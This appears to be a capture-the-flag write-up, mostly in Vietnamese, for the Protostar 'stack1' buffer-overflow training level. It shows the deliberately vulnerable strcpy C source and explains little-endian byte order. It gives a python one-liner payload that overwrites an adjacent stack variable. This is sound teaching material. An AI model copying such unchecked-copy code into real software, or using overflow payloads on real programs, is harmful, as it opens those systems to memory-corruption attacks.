# STACK ONE

## About

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints
  
  * If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
  * Protostar is little endian

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Solutions

`STACK ONE` là nâng cấp của `STACK ZERO` với yêu cầu bây giờ là chúng ta thay đổi giá trị của biến `modified` bằng giá trị được yêu cầu là `0x61626364` và thay việc lấy stdin từ gets thì `buffer` được sao chép các ký tự từ `argv[1]` - `Đối số thứ nhất của chương trình` thông qua hàm strcpy() cũng có thể khai thác buffer overflow.

`$ man strcpy`

```
BUGS
       If  the  destination  string  of  a  strcpy() is not large enough, then anything might happen.
       Overflowing fixed-length string buffers is a favorite cracker technique  for  taking  complete
       control  of  the  machine.  Any time a program reads or copies data into a buffer, the program
       first needs to check that there's enough space.  This may be unnecessary if you can show  that
       overflow  is  impossible, but be careful: programs can get changed over time, in ways that may
       make the impossible possible.
```

Hàm strcpy() có thể buffer overflow khi chuỗi đích không đủ giá trị để chứa chuỗi coppy từ chuỗi nguồn -> ghi đè lên các thành phần khác trong STACK

Một lưu ý nữa từ Hint là `Little Edian` vậy nên thay vì nhập `\x61\x62\x63\x64` (abcd) thì sẽ là  `\x64\x63\x62\x61` (dcba)

```
root@protostar:/opt/protostar/bin# ./stack1 $(python -c 'print "A" * 64 + "dcba"')                      
you have correctly got the variable to the right value 
```

## Documents

<https://en.wikipedia.org/wiki/Stack-based_memory_allocation>

<https://www.educative.io/edpresso/what-is-gets-in-c>

<https://en.wikipedia.org/wiki/Endianness>

